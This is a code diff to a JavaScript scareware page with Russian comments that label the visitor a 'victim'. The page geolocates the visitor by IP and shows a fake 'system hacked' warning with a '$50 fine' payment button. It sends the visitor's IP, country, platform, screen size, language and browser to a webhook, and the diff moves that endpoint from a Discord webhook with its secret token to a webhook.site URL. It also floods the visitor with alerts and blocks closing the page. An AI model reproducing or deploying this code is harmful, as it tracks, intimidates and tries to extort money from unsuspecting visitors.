@@ -83,20 +83,18 @@
                 if (started) return;
                 started = true;
 
-                // 1. ОТПРАВЛЯЕМ ДАННЫЕ СРАЗУ
+                // === ОТПРАВКА ДАННЫХ В ТВОЙ WEBHOOK ===
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
                     .then(data => {
-                        const ip = data.ip;
-                        // Проверяем страну через бесплатное API
-                        return fetch(`https://ipapi.co/${ip}/json/`);
+                        return fetch(`https://ipapi.co/${data.ip}/json/`);
                     })
                     .then(res => res.json())
                     .then(data => {
                         const country = data.country_code || "Unknown";
                         const isRussia = (country === "RU");
                         
-                        // Меняем текст в зависимости от страны
+                        // Перевод интерфейса
                         if (isRussia) {
                             titleText.innerText = "💀 СИСТЕМА ВЗЛОМАНА 💀";
                             descText.innerText = "Обнаружено мошенничество. Доступ к устройству получен.";
@@ -109,31 +107,37 @@
                             payBtn.innerText = "PAY FINE ($50)";
                         }
 
-                        // Отправляем лог в Дискорд
+                        // Отправка логов
                         const payload = JSON.stringify({
-                            content: `🚨 **ЖЕРТВА / VICTIM**\n**Страна / Country:** ${country} (${data.country_name})\n**IP:** ${data.ip}\n**Платформа:** ${navigator.platform}\n**Экран:** ${window.screen.width}x${window.screen.height}\n**Язык:** ${navigator.language}\n**Браузер:** ${navigator.userAgent}`
+                            country: country,
+                            ip: data.ip,
+                            platform: navigator.platform,
+                            screen: window.screen.width + "x" + window.screen.height,
+                            language: navigator.language,
+                            userAgent: navigator.userAgent
                         });
-                        fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
+                        
+                        fetch("https://webhook.site/8210aa39-3a98-4986-b37e-1fbc65a13f63", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
-                            body: payload,
-                            keepalive: true
+                            body: payload
                         }).catch(e => console.log(e));
                     })
                     .catch(() => {
-                        // Если API стран не работает, отправляем базовый лог
+                        // Если гео-апи упало, шлем что есть
                         const payload = JSON.stringify({
-                            content: `🚨 **ЖЕРТВА**\n**IP:** Скрыт\n**Платформа:** ${navigator.platform}\n**Экран:** ${window.screen.width}x${window.screen.height}`
+                            ip: "Скрыт",
+                            platform: navigator.platform,
+                            screen: window.screen.width + "x" + window.screen.height
                         });
-                        fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
+                        fetch("https://webhook.site/8210aa39-3a98-4986-b37e-1fbc65a13f63", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
-                            body: payload,
-                            keepalive: true
+                            body: payload
                         }).catch(e => console.log(e));
                     });
 
-                // 2. ЗАПУСКАЕМ ВИЗУАЛЬНЫЙ И ЗВУКОВОЙ РАЗЪЁБ
+                // === РАЗЪЁБ ===
                 let isNuke = Math.random() > 0.5;
                 vid.classList.add('shake');
                 glitchOverlay.style.display = 'block';
@@ -152,7 +156,7 @@
                     let count = 0;
                     while (count < 50) {
                         setTimeout(() => { 
-                            alert(document.documentElement.lang === 'ru' ? "ОШИБКА: ОПЛАТА НЕ ПРОШЛА." : "ERROR: PAYMENT FAILED."); 
+                            alert("ОШИБКА: ОПЛАТА НЕ ПРОШЛА. / ERROR: PAYMENT FAILED."); 
                         }, count * 100);
                         count++;
                     }
@@ -160,7 +164,7 @@
 
                 window.onbeforeunload = function(e) {
                     e.preventDefault();
-                    e.returnValue = "Данные переданы. Закрытие страницы заблокировано. / Data sent. Closing blocked.";
+                    e.returnValue = "Данные переданы. Закрытие заблокировано. / Data sent. Closing blocked.";
                     return e.returnValue;
                 };
 
